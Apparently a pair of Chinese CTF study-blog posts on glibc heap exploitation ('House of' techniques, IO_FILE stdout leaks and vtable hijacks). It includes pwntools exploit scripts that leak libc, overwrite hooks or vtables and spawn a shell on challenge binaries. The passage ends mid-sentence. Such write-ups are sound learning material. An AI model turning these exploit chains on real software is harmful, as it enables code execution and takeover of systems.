[{"title":"House of 系列","url":"/2025/11/18/House-of-%E7%B3%BB%E5%88%97/","content":"\n1.House Of Einherjar其实就是off by null+堆叠\n隐式链表：通过pre_size找上一个堆块，通过size找下一个堆块\n补充一写，还是有些不同\n当释放堆块下一个块是top_chunk的时候，free会与相邻后向地址进行合并，并且放入top_chunk,在申请时，就会从前面那个堆块的地址中申请出来\n两个相邻的堆块，前一个堆块是free状态，free后一个堆块，会和前一个堆块合并也就是unlink，如何找到前一个堆块，根据的是pre_size为的大小（其实就是两个堆块头部的偏移），还要绕过unlink，也就是前一个堆块的size位与后一个堆块的pre_size位相等\n虽说是相邻的（并且已经被free的堆块必须在前面也就是低地址），但是加入伪造了一个堆块在栈上\nfake_chunk的prev_size、size部分设置为0x100，fd、bk、fd_nextsize、bk_nextsize设置为fake_chunk自身地址，这样做是为了绕过free()函数后向合并时最后的unlink检查\n\n我们可以将后一个堆块的pre_size位设为负数，就可以找到栈上的那个堆块\n0x555555758049-0x7fffffffdf00&#x3D;0xffffd5555575a140\n\n例题：tinypad\n当got表不可以打的时候，我们可以打free_hook,free_hook不可打，利用__environ，泄露栈地址打返回地址，返回地址不可打，我们可以打main函数的返回地址\n\n将堆块伪造在0x602040\n\npre_size位设置的和将要被free的堆块大小相同，size位设为两个堆块的偏移\nfd、bk、fd_nextsize、bk_nextsize设置为fake_chunk自身地址\n将要被free的堆块在0x6030f0\n\n将pre_size设为两个堆块的偏移，将利用0ff by null 将 pre_inuse设置为0\n然后free堆块，top_chunk的地址就编程伪造堆块的地址了（0x602040）\n显示不是但是申请就是\n\n存储堆块指针的数组在0x602140\n我们从0x602040申请0xe0，在申请一个堆块数据段刚好申请在0x602140\nreq &#x3D; 0x602140-0x602040 - 0x20(0x10)\n\n然后在申请一个堆块，这个堆块的数据段，就刚好位于储存指针的数组的位置，然后就是更改指针，实现任意地址写了\n然后就是如何泄露栈地址，与更改返回地址了\n\n这样构造\n将堆块1的指针改为__environ，然后打印堆块1就可以泄露栈地址\n将堆块2的指针改为记录堆块1指针数组的地址，这样通过堆块2，更改堆块1的指针\n通过将堆块1的指针改为返回地址的栈的值\n\n然后更改堆块1的内容为ogg即可，这道题改的是main函数的返回地址，free_hook和返回地址都改不了，不知道为啥\n\ndd(0xe8, b&quot;A&quot;*0xe8)add(0xf0, b&quot;B&quot;*0xf0)add(0x100, b&quot;C&quot;*0x100)add(0x100, b&quot;D&quot;*0x100)#bug()free(3)p.recvuntil(b&#x27; #   INDEX: 3&#x27;)fd =u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))log.success(&#x27;fd-&gt; &#x27;+hex(fd))libc_base = fd - 0x3c4b78log.success(&#x27;libc_base-&gt; &#x27;+hex(libc_base))#bug()free(1)p.recvuntil(b&#x27; #   INDEX: 1&#x27;)p.recvuntil(b&#x27; # CONTENT: &#x27;)heap_addr = u32(p.recvuntil(&#x27;\\x0a\\x0a\\x0a&#x27;)[0:3].ljust(4,b&#x27;\\x00&#x27;))-0x1f0log.success(&#x27;heap_addr-&gt; &#x27;+hex(heap_addr))chunk_list_addr=0x602040chunk2_addr=heap_addr+0xf0offset=chunk2_addr-chunk_list_addrlog.success(&#x27;chunk_list_addr &gt;&gt; &#x27;+hex(chunk_list_addr))log.success(&#x27;chunk2_addr &gt;&gt; &#x27;+hex(chunk2_addr))log.success(&#x27;offset &gt;&gt; &#x27;+hex(offset))add(0xe8, b&#x27;A&#x27;*(0xe0) + p64(offset))#bug()free(4)payload=p64(0x100)+p64(offset)payload+=p64(chunk_list_addr)*4edit(2, payload)#bug()free(2)payload = p64(0xe8) + p64(libc_base + libc.symbols[&quot;__environ&quot;])payload += p64(0x100) + p64(0x602148)add(0xe0, &quot;t&quot;*0xe0)add(0x100, payload)bug()p.readuntil(&quot;# CONTENT: &quot;)stack_env=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0xf0edit(2,p64(stack_env))gadget = [0x4527a,0xf03a4,0xf1247]gadget_addr = libc_base + gadget[2]edit(1,p64(gadget_addr))bug()p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)p.sendline(&quot;Q&quot;)p.interactive()\n\n\n\n2.house  of  froce控制top_chunk的地址\ntop_chunk的size位大小有显示，我们只能申请堆块在堆得内存区域，而申请不到在bss段上（bss段在堆得下方，所以永远申请不到），如果我们改变top_chunk的size位使他为-1（0xffffffffffffffff），我们就可以申请一个超级大的堆块，使他转一圈转到bss段上\n在2.23和2.27的libc版本中，由于没有对top chunk的size合法性进行检查，因此如果我们能够通过堆溢出控制top chunk的size位为-1\n\n如何计算：\nreq &#x3D; dest-old_top - 0x20(0x10)\ndest就是我们将要写入的地址\n1.如何修改top_chunk的size位\n申请一个挨着top_chunk的堆块堆溢出就可以修改\n2.需要泄露出top_chunk的地址，这道题直接打印出每个堆块的指针的地址，通过紧挨着top_chunk那个堆块就可以算出\n3.这道题打malloc_hook，为什么没有用ogg\n因为知道指针的地址，也就知道&#x2F;bin&#x2F;sh写入的地址，将malloc_hook改为system，申请堆块时候，写上&#x2F;bin&#x2F;sh的地址就可以（或者通过realloc调整栈帧）\n例题：gyctf_2020_force\nlibc_base = add(0x200000,b&#x27;aaaa&#x27;)+0x200ff0malloc = libc_base+libc.sym[&#x27;__malloc_hook&#x27;]system = libc_base+libc.sym[&#x27;system&#x27;]log.success(&#x27;libc_base-&gt;&#x27;+hex(libc_base))payload =p64(0)*2+b&#x27;/bin/sh\\x00&#x27;+p64(0xffffffffffffffff)top_chunk = add(0x10,payload)+0x10req = malloc -top_chunk-0x20add(req,b&#x27;aaaa&#x27;)add(0x10,p64(system))p.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&quot;size\\n&quot;)p.sendline(str(top_chunk))\n\n3.house  of  lore主要就是围绕smallbin的\n1.堆块如何进入smallbin，当unsortbin中有一个堆块，在申请一个堆块，大于unsortbin中的堆块，且unsortbin中的堆块不能合并，或者合并后也达不到大小，就会把unsortbin放入smallbin当中\n2.如何伪造堆块到smallbin中\n首先申请一个0x100的堆块\n在栈上伪造两个堆块，伪造他们的fd与bk，就像下面的一样\n\n就像这样，然后将victim free掉(在这之前再申请一个堆块，防止与top chunk合并)，他会进入unsortbin，然后，在申请一个大于他的堆块，他就会进入smallbin，然后再修改victim的bk指针，这时栈上的两个假的堆块就会进入smallbin中\n\n然后我们再申请一个，victim就会被申请出来，smallbin先进先出，再申请一个，栈地址上的堆块就可以申请出来，就可以写数据，覆盖返回地址\n4.House of Orange概述 ¶\nHouse of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。\n原理 ¶\n如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。\n我们总结一下伪造的 top chunk size 的要求\n\n伪造的 size 必须要对齐到内存页（addr+size是0x1000（4kb）对齐的）\n\n因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size\n\nsize 要大于 MINSIZE(0x10)\nsize 要小于之后申请的 chunk size + MINSIZE(0x10)\nsize 的 prev inuse 位必须为 1\n\n之后原有的 top chunk 就会执行_int_free从而顺利进入 unsorted bin 中。\n5.house  of   rabbit利用触发 malloc consolidate，将fastbin的堆块放入unsortbin时候不会对size位进行检查，来实现堆叠\n触发malloc consolidate条件\n1.fastbin当中没有合适大小的堆块，先合并，合并不够就会被放入unsortbin（smallbin）这时不会对size位进行检查就触发堆叠了\n2.top chunk不够了\n6.house of botcakeglibc2.29～glibc2.31，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 house of botcake，他的本质也是通过 UAF 来达到绕过的目的\n当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 key == tcache_key ， 就会遍历这个大小的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。\n从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：\n之前只是检查链表的上一个，这次是检查全部的链表\n从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：\n\n破坏掉被 free 的堆块中的 key，绕过检查（常用）\n改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries\nHouse of botcake（常用没有edit）\n\n1.free后用uaf改bk，然后就可以再次free\n2没学\n3.House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。\nfor i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i)   free(8)show(8)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x1ebbe0print(hex(libc_base))free(7)add(10,0x100,b&#x27;aaaa&#x27;)system = libc_base +libc.sym[&#x27;system&#x27;]free(8)free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]payload = b&#x27;a&#x27;*0xf0+p64(0)*3+p64(0x101)+p64(free_hook)add(11,0x150,payload)add(12,0x100,b&#x27;aaaa&#x27;)add(13,0x100,p64(system))free(9)for i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i) free(8)\n\n堆块8进入unsortbin\nfree(7)\n\n堆块8与堆块7合并\nmalloc(0x100)\n\ntcachebin中就空出来一个\n然后再次\nfree(8)\n\n这时8被free两次，一次在unsortbin中，另一次在tcachebin中，而且形成堆叠，8在7这个合并的大堆块中\nadd(11,0x150,payload)\n\n申请一个大堆块，改堆块8的fd\ntcachebin attack\n提问：为什么不能先free(7)后free(8)\n因为后面double free free(7),unsortbin链表就被破坏了\n\n更高版本没有edit  tcachebin attack\nfor i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i)   free(7)show(7)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x1ebbe0print(hex(libc_base))free(8)bug()add(10,0x210,b&#x27;\\x10&#x27;)add(11,0x100,b&#x27;/bin/sh\\x00&#x27;)free(8)free(10)add(12,0x210,b&#x27;a&#x27;*0x110+p64(fd))for i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i)free(7)free(8)\n\n7,8堆块合并进入unsortbin\nadd(10,0x210,b&#x27;\\x10&#x27;)\n\n将他两个申请出来，但是有uaf，所以7堆块和10堆块的指针指向同一块地址\nadd(11,0x100,b&#x27;/bin/sh\\x00&#x27;)\n\n将tachebin空出来一个\nfree(8)\n\n进入tachebin\nfree(10)add(12,0x210,b&#x27;a&#x27;*0x120)\n\nfree10，又将10申请出来，12就可以覆盖到8\n7.House-of-Corrosion通过改bins的大小限制，使他可以存无限大的堆块的指针（就是往后面存），从而实现往任意地址写一个堆指针\n但是只能在管理堆bins的后面\n首先我们要修改bins的大小（任意地址写，unsortbinattack等）\n例子1：fastbin​           fastbinY[0]&#x3D;0x7ffff07dcfc50\n​          _IO_list_all&#x3D;0x7ffff07dd06c0\nchunk size &#x3D; (delta * 2) + 0x20 ，delta为目标地址与fastbinY的offset\n在这个例子中，chunk大小应该是(0x7ffff7dd06c0-0x7ffff7dcfc50)*2+0x20&#x3D;0x1500字节\n例子2：tcachebin改mp_.tcache_bins &#x3D; obstack_exit_failure-0x20\nmp_.tcache_bins &#x3D; libc.sym[‘obstack_exit_failure’]+libc_base\nhttps://xz.aliyun.com/news/15532\n​             entries[0] &#x3D; 0x555555605090\n​             因为他这个是在堆上，所以我们可以直接让他在第一个堆块里面，然后改他为free_hook,然后再申请出来就可以了\n\n我们将这个本来是0x40改成一个大的值之后当申请大的堆块他也会进入tcachebin，然后他的指针就会被存起来，在这个初始化堆块，0x5090就是存大小为0x20链表头的堆块指针，依次往后所以我们申请一个大堆块，他的指针就会往后面写，写道我们申请的第一个堆块我们就可以利用第一个堆块修改它\n\nfree大堆块之后\n\n但是bins里面不会有，但是它实际上是有的\n\n所以我们改成free_hook之后，直接申请就可以申请出来\nadd(0x100,b&#x27;a&#x27;) #0add(0x410,b&#x27;a&#x27;) #1add(0x100,b&#x27;a&#x27;) #2free(1)add(0x410,b&#x27;a&#x27;*7)#1libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x1ebbe0print(hex(libc_base))add(0x500,b&#x27;3&#x27;)add(0x100,b&#x27;4&#x27;)p.sendline(b&#x27;2&#x27;)tcache_bins = libc.sym[&#x27;obstack_exit_failure&#x27;]+libc_base-0x20p.send(p64(tcache_bins)+p64(tcache_bins)*4)free(3)bug()free(0)free_hook = libc_base+libc.sym[&#x27;__free_hook&#x27;]add(0x100,b&#x27;a&#x27;*0x68+p64(free_hook))system = libc.sym[&#x27;system&#x27;]+libc_baseadd(0x500,p64(system))free(2)add(0x100,b&#x27;/bin/sh&#x27;)free(2)\n","categories":["堆"],"tags":["知识点"]},{"title":"IO","url":"/2025/11/18/IO/","content":"\n1.利用stdout泄露libc\n设置_flag &amp;~ _IO_NO_WRITES即_flag &amp;~ 0x8。\n设置_flag &amp; _IO_CURRENTLY_PUTTING即_flag | 0x800\n设置_fileno为1。\n设置_IO_write_base指向想要泄露的地方；_IO_write_ptr指向泄露结束的地址。\n设置_IO_read_end等于_IO_write_base或设置_flag &amp; _IO_IS_APPENDING即_flag | 0x1000。\n设置_IO_write_end等于_IO_write_ptr（非必须）（fwrite）\n\n泄露libc 将结构体内容覆盖\n\n泄露 _IO_file_jumps 的写法：\n\npayload = p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot;\n\n\n泄露 _IO_2_1_stdin_ 的写法：\n\npayload = p64(0xfbad3887)+p64(0)*3+p8(0)\n\n三个p64(0)为了覆盖 _IO_read_ptr、 _IO_read_end、 _IO_read_base，这几个没什么用所以直接覆盖0就行，最后 b’\\x00’再把 _IO_write_base的最后一字节改成00，假设一开始_IO_write_base&#x3D;_IO_write_end&#x3D;0xffff,则此时_IO_write_base&#x3D;0xff00,再次调用puts或者write就会把0xff00-0xffff之间内容打出来，里面会有libc相关地址，也就达成了泄露目的。\n思路：想篡改stdout需要先拿到它的地址，通常是通过main_arena地址间接拿到stdout地址（爆破一字节）\n一个堆块在unsortbin与fastbin，这样他的fd就是main_arena+88，覆盖后面四个字节，但是倒数第四个需要爆破，fastbin attack就能实现申请到了\n例题1 UAF 堆风水\nadd(0x60,0,b&#x27;aaaa&#x27;)add(0x60,1,b&#x27;aaaa&#x27;)add(0x60,2,b&#x27;aaaa&#x27;)add(0x20,3,b&#x27;aaaa&#x27;)free(1)free(0)edit(0,b&#x27;\\x50&#x27;)#bug()add(0x60,4,p64(0)*9+b&#x27;\\x71&#x27;)add(0x60,5,p64(0)*3+b&#x27;\\xe1&#x27;)free(1)free(0)free(2)edit(2,b&#x27;\\x70&#x27;)\n\n只能创建0x60的堆块，UAF漏洞，堆风水具体如何实现\n代码就是这一部分\n为什么先free1，后free0，因为我们要改堆块1的size位位0xe1，这就需要先把堆块1往小地址改一点，通过这个假的堆块1，将真正的堆块1的size位改了，应为又uaf所以free了指针也不会被清零，具体实现\n\nedit(0,b&#x27;\\x50&#x27;)\n\n先free挂入链表，将堆块0的fd改为50，也就是将堆块1前一一点点\nadd(0x60,4,p64(0)*9+b&#x27;\\x71&#x27;)\n\n这个其实就是堆块0，后入先出，伪造假堆块1的size位，我们看一下\n\n可以看到成功在50处伪造了size位，这时我们申请堆块5，就会申请到50那个地方（看bins）并且可以通过这个改真正堆块1的size位\nadd(0x60,5,p64(0)*3+b&#x27;\\xe1&#x27;)\n\n![img]1754548159692-6e637918-479e-4585-9d6b-bccaaa2df6f1.png)\n可以看到该成功了\n然后\nfree(1)\nfree(0)\nfree(2)\n这样堆块1就会进入unsortbin，堆块0，2进入fastbin，2-&gt;0\n\nedit(2,b&#x27;\\x70&#x27;)\n\n然后修改堆块2的fd，将00，改成70，这样unsortbin就被挂入fastbin\n\n然后改一下堆块2fd &#x3D; main_arena+88后两字节，倒数第四位需要爆破一下，但是这个虽然被挂进去了，我们发现堆块2的size位还是0xe1，这样即使挂进去了也申请不出来，我们不能直接edit(2)\n应该\nedit(5,p64(0)*3+b&#x27;\\x71&#x27;+b&#x27;\\x00&#x27;*7+b&#x27;\\xdd\\x55&#x27;)\n\n再往后申请三次就出来了，然后正常改结构就行\nadd(0x60,6,b&#x27;aaaa&#x27;)add(0x60,7,b&#x27;aaaa&#x27;)payload = b&#x27;\\x00&#x27;*51+p64(0xfbad1800) + p64(0)*3 + b&#x27;\\x00&#x27; #studinadd(0x60,8,payload)\n\n再往后打malloc就行，这里又学到了一点，正常是需要realloc来调整栈的，但是直接触发double free就可以，不用调整\n完整代码：\nadd(0x60,0,b&#x27;aaaa&#x27;)add(0x60,1,b&#x27;aaaa&#x27;)add(0x60,2,b&#x27;aaaa&#x27;)add(0x20,3,b&#x27;aaaa&#x27;)free(1)free(0)edit(0,b&#x27;\\x50&#x27;)add(0x60,4,p64(0)*9+b&#x27;\\x71&#x27;)add(0x60,5,p64(0)*3+b&#x27;\\xe1&#x27;)free(1)#bug()free(0)free(2)#bug()edit(2,b&#x27;\\x70&#x27;)bug()edit(5,p64(0)*3+b&#x27;\\x71&#x27;+b&#x27;\\x00&#x27;*7+b&#x27;\\xdd\\x55&#x27;)add(0x60,6,b&#x27;aaaa&#x27;)add(0x60,7,b&#x27;aaaa&#x27;)#bug()#payload = b&#x27;\\x00&#x27;*51+p64(0xfbad1800) + p64(0)*3 + b&#x27;\\x00&#x27; #studinpayload = b&#x27;\\x00&#x27;*51+p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot;   #io file jmp#bug()add(0x60,8,payload)buf= u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))log.success(&#x27;buf = &#x27;+hex(buf))bug()pause()libc_base = buf-0x3c5600print(hex(libc_base))#bug()addr = libc_base +0x3c4aedfree(0)edit(0,p64(addr))#bug()add(0x60,9,b&#x27;aaaa&#x27;)shell = libc_base+0x4526apayload = b&#x27;\\x00&#x27;*0x13+p64(shell)add(0x60,10,payload)free(0)free(0)\n\n例题2数组越界\nv1没有规定正，数组越界，通过二级指针可以改内容，就是改一个地址里面存了的一个地址，这个地址的内容\nadd(b&#x27;a&#x27;)add(b&#x27;b&#x27;)add(b&#x27;c&#x27;)add(b&#x27;d&#x27;)bug()edit(b&#x27;-11&#x27;,b&#x27;\\x48&#x27;)edit(b&#x27;-8&#x27;,p64(0xfbad1800)+p64(0)*3+b&#x27;\\x00&#x27;)libc_ = get_address()print(hex(libc_))libc_base = libc_ - 0x1EB980-0x1000print(hex(libc_base))system_ = libc_base + libc.sym[&#x27;system&#x27;]print(&quot;system --&gt; &quot;+hex(system_))iolistall =  libc_base + libc.sym[&#x27;_IO_list_all&#x27;]print(&quot;IO_list_all --&gt; &quot;+hex(iolistall))bin_sh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]print(&quot;free_hook --&gt; &quot;+hex(free_hook))edit(b&#x27;-11&#x27;,p64(free_hook))bug()edit(b&#x27;-3&#x27;,p64(system_))edit(b&#x27;2&#x27;,b&#x27;/bin/sh\\x00&#x27;)dele(b&#x27;2&#x27;)\n\n首先我们看一下\nedit(b’-11’,b’\\x48’)这个\n我们可以看到他这个是指向自己的，也就是通过二级指针该自己的内容，那我们可以把他改成别的来看一下\n\n就像这样\nedit(b’-11’,p64(free_hook))\n然后我们改他把free_hook写进去，然后通过completed这个指针就可以改free_hook的内容了\nedit(b’-3’,p64(system_))\n\n就像这样\nedit(b’-8’,p64(0xfbad1800)+p64(0)*3+b’\\x00’)\n这个就是改IO_FILE的不再解释了\n\n2.stdin标准输入缓冲区进行任意地址写\n设置_IO_read_end等于_IO_read_ptr。\n设置_flag &amp;~ _IO_NO_READS即_flag &amp;~ 0x4（清除 **_flag** 中第 2 位）。\n设置_fileno为0。\n设置_IO_buf_base为write_start，_IO_buf_end为write_end；且使得_IO_buf_end-_IO_buf_base大于fread要读的数据。（fread）\n\n在_IO_new_file_underflow函数中先判断fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end是否成立，成立则直接返回，因此再次要求伪造的结构体_IO_read_end ==_IO_read_ptr，绕过该条件检查。\n接着函数会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。\n最终系统调用_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)读取数据，因此要想利用stdin输入缓冲区需设置FILE结构体中_IO_buf_base为write_start，_IO_buf_end为write_end。同时也需将结构体中的fp-&gt;_fileno设置为0，最终调用read (fp-&gt;_fileno, buf, size))读取数据。\n利用：任意地址写一个0利用，将_IO_buf_base最后一位写成0，第二次再写就会往这里写，从而完全控制\n\n3.stdout标准输入缓冲区进行任意地址写任意写功能的实现在于IO缓冲区没有满时，会先将要输出的数据复制到缓冲区中，可通过这一点来实现任意地址写的功能。可以看到任意写好像很简单，只需将_IO_write_ptr指向write_start，_IO_write_end指向write_end即可（fwrite）\n4.House of Orange2.23没有free通过改top chunk来实现，house of 系列里面讲过了\n具体讲io部分\n\n\n通过unsortbin attack往任意地址写入一个大的值（也就是main_arean+88）这个unsortbin attack有讲忘了自己去看，我们可以往_IO_list_all写入main_arean+88，main_arean+88+0x68这个偏移就是chain字段，而这个地址刚好是smallbin中size为0x60的数组，我们往大小为0x60的smallbin中写数据就正好是往chain字段这个地址中写，就可以构造结构体\n\n具体构造\n将_flags字段写入&#x2F;bin&#x2F;sh\n将 _IO_write_ptr改成0x1\n将 _IO_write_end改成0x0\n将_mode改成0\n将chain构造为&amp;flags\n将vtable的地址改成&amp;vtable\n然后在vtable字段后再跟16个字节的0最后写上system函数的地址\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)libc = ELF(&#x27;/home/he/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;)p = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)def bug():    gdb.attach(p)def add(size,content):    p.recvuntil(b&#x27;Your choice : &#x27;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&#x27;Length of name :&#x27;)    p.sendline(str(size))    p.recvuntil(b&#x27;Name :&#x27;)    p.send(content)    p.recvuntil(b&#x27;Price of Orange:&#x27;)    p.send(b&#x27;20&#x27;)    p.recvuntil(b&#x27;Color of Orange:&#x27;)    p.send(b&#x27;1&#x27;)def edit(size,content):    p.recvuntil(b&#x27;Your choice : &#x27;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&#x27;Length of name :&#x27;)    p.sendline(str(size))    p.recvuntil(b&#x27;Name:&#x27;)    p.send(content)    p.recvuntil(b&#x27;Price of Orange:&#x27;)    p.send(b&#x27;20&#x27;)    p.recvuntil(b&#x27;Color of Orange:&#x27;)    p.sendline(str(2))add(0x10,b&#x27;chunk0&#x27;)payload = b&#x27;b&#x27;*0x18+p64(0x21)+p64(0)*3+p64(0xfa1)edit(0x100,payload)add(0x1000,b&#x27;bbbbbbbb&#x27;)add(0x400,b&#x27;cccccccc&#x27;)p.recvuntil(b&#x27;Your choice : &#x27;)p.sendline(b&#x27;2&#x27;)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x3c4b78-0x610io_list_all=libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]print(hex(libc_base))pause()print(hex(io_list_all))edit(0x10,b&#x27;d&#x27;*15+b&#x27;b&#x27;)p.recvuntil(b&#x27;Your choice : &#x27;)p.sendline(b&#x27;2&#x27;)p.recvuntil(b&#x27;db&#x27;)heap_addr = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(heap_addr))sys_addr = libc_base+libc.sym[&#x27;system&#x27;]print(hex(heap_addr+0x430))pause()payload= b&#x27;a&#x27;*0x400+p64(0)+p64(0x21)+p64(0)*2+b&#x27;/bin/sh\\x00&#x27;+p64(0x61)+p64(0)+p64(io_list_all-0x10)+p64(0)+p64(1)+p64(0)*7+p64(heap_addr+0x430)+p64(0)*13+p64(heap_addr+0x508)+p64(0)+p64(0)+p64(sys_addr)bug()edit(0x1000,payload)bug()p.interactive()payload=b&#x27;f&#x27;*0x400payload+=p64(0)+p64(0x21)payload+=p64(0)+p64(0)  #堆溢出覆盖payload+=b&#x27;/bin/sh\\x00&#x27;+p64(0x61) flags字段，且将size位伪造为0x61，进入smallbinpayload+=p64(0)+p64(io_list_all-0x10) fd和bkpayload+=p64(0)+p64(1)#_IO_write_base &amp; _IO_write_ptrpayload+=p64(0)*7payload+=p64(leak_heap+0x430)#chainpayload+=p64(0)*13payload+=p64(leak_heap+0x508)#vtablepayload+=p64(0)+p64(0)+p64(sys_addr)#DUMMY finish overflow\n\n将chain字段构造为flags的地址，也就是smallbins的头部\n\n将vtable就写成vtable所在的地址\n\n原理：因为unsortedbin得链表已经被破坏，在遍历链表的时候就发生错误，就会调用errout，而errout调用的是malloc_printerr，其又主要调用了_libc_message函数，又调用了abort，而about中调用fflush（NULL）\n\n将vtable就写成vtable所在的地址，往后面第四个写system地址（虚表中overflow就位于第四个），也就相当于调用system并且将链表头部节点作为参数也就是&#x2F;bin&#x2F;sh的地址，就调用了system（&#x2F;bin&#x2F;sh）获得shell\n2.24-2.262.24-2.26 加入虚表保护，虚表需要在一定范围里面这时候在这样构造\n\n_IO_str_finish\n\n将&#x2F;bin&#x2F;sh地址写在偏移0x38的地方也就是IO_buf_base \n将system写在偏移0xe8的地方\n这样就会调用system(&#x2F;bin&#x2F;sh)\n查找IO_str_jumps\nfor ref_offset in libc.search(p64(IO_str_underflow_offset)):    possible_IO_str_jumps_offset = ref_offset - 0x20    if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:        print (hex(possible_IO_str_jumps_offset))        breakpayload=b&#x27;f&#x27;*0x400payload+=p64(0)+p64(0x21)payload+=p64(0)+p64(0)  #堆溢出覆盖payload+=p64(0)+p64(0x61) flags字段，且将size位伪造为0x61，进入smallbinpayload+=p64(0)+p64(io_list_all-0x10) fd和bkpayload+=p64(0)+p64(1)#_IO_write_base &amp; _IO_write_ptrpayload+=p64(0)+p64(bin_sh)+p64(0)*5 #IO_buf_base = &amp;/bin/sh offset = 0x38(7)payload+=p64(0)#chainpayload+=p64(0)*13payload+=p64(IO_str_jumps-0x8)#vtablepayload+=p64(0)+p64(sys_addr) #IO file offset = 0xe8 (29)\n\n2.27\n2.27开始移除了abort函数中的fflush(NULL)，劫持_IO_list_all就失效了\n2.29 \n2.29开始虚表是可以写的，如果有任意地址写的漏洞可以直接改虚表函数指针\n4.House of Apple2（1）2.35House of Apple2（system）执行exit的流程：_IO_wfile_overflow--&gt;&gt;_IO_wdoallocbuf    --&gt;&gt;_IO_WDOALLOCATE        --&gt;&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)/            *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_doallocate)(fp)\n\nf-&gt;flags!&#x3D;0x8  &amp;&amp;  f-&gt;flags!&#x3D;0x800 &amp;&amp; f-&gt;flags!&#x3D;0x2\nvtable设置为_IO_wfile_jumps使其能成功调用_IO_wfile_overflow即可\n_wide_data设置为可控堆地址heap_addr1，即满足*(f + 0xa0) &#x3D; heap_addr1\n_wide_data-&gt;_IO_write_base设置为0，即满足*(heap_addr1 + 0x18) &#x3D; 0\n_wide_data-&gt;_IO_buf_base设置为0，即满足*(heap_addr1 + 0x30) &#x3D; 0\n_wide_data-&gt;_wide_vtable设置为可控堆地址heap_addr2，即满足*(heap_addr1 + 0xe0) &#x3D; heap_addr2\n_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持执行流，即满足*(heap_addr2 + 0x68) &#x3D; C\n\n这里回答一些问题？1.为什么要将虚表的地址写为IO_wfile_jumps因为我们将stderr劫持了，虚表的地址就变化了，他就调用_IO_vtable_check检查，但是我们将虚表的地址改为IO_wfile_jumps，他就不会触发保护、\n2.heap2为什么要这样布局\n我们可以看到 rax &#x3D; {rax+0xe0(28)这个地方的地址}\n其实就是wide_data的vtable \n也就是rax &#x3D; {wide_data的vtable}的值\n我们将vtable的值写成了heap2的头也就是\nrax就是heap2的地址\n然后取出call &#x3D; 